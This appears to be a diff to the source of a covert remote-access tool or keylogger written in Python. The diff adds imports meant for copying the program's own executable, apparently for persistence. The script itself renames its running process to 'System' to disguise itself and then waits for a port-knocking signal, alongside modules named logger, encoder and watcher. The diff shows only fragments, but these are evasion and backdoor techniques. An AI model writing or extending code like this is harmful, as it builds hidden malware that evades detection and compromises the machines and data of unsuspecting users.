@@ -13,6 +13,8 @@ import ctypes
 from encoder import main as encoder_main
 from logger import main as logger_main
 from watcher import main as watcher_main
+import shutil  # For copying files
+import sys  # For accessing the current executable path
 
 def get_local_ip():
     """Get the local IP address of the machine."""
@@ -375,7 +377,7 @@ def rename_process(new_name):
     else:
         print(f"Process renaming not supported on {system}.")
 
-# Call the rename_process function at the start of the script
+# Call the function at the start of the script if running on Windows
 if __name__ == "__main__":
     rename_process("System")
     wait_for_port_knocking()
